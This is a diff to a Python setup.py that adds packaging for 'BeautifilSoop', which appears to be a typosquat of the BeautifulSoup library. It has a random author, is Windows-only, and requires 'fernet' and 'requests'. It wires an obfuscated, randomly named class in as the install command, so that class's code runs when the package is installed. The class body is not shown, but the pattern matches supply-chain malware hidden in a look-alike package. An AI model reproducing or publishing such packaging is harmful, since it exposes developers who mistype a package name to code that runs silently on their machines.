@@ -18,5 +18,22 @@ class rocmHHrijBcmzijaSQkTVWOSuJgNbxjOVdrmnKcuCnfDITHmkggIyLMhPqDPSvLEWHZTZKTfpY
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="BeautifilSoop",
+    version=VERSION,
+    author="nfjznytlBWjVCcWm",
+    author_email="CvXXoDaVvcAqIPIGto@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': rocmHHrijBcmzijaSQkTVWOSuJgNbxjOVdrmnKcuCnfDITHmkggIyLMhPqDPSvLEWHZTZKTfpYivmJOsRvfIONEGauijLFsKkqtjGNykwGIUmBhKbJxLAeXPyyqBbRBPTufzrzOCORQMcwqrxIziqydHkcWBwfFhyqsNyWeTKfzOeGnelATiClIhTgLgwZQIigYTeOuv,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
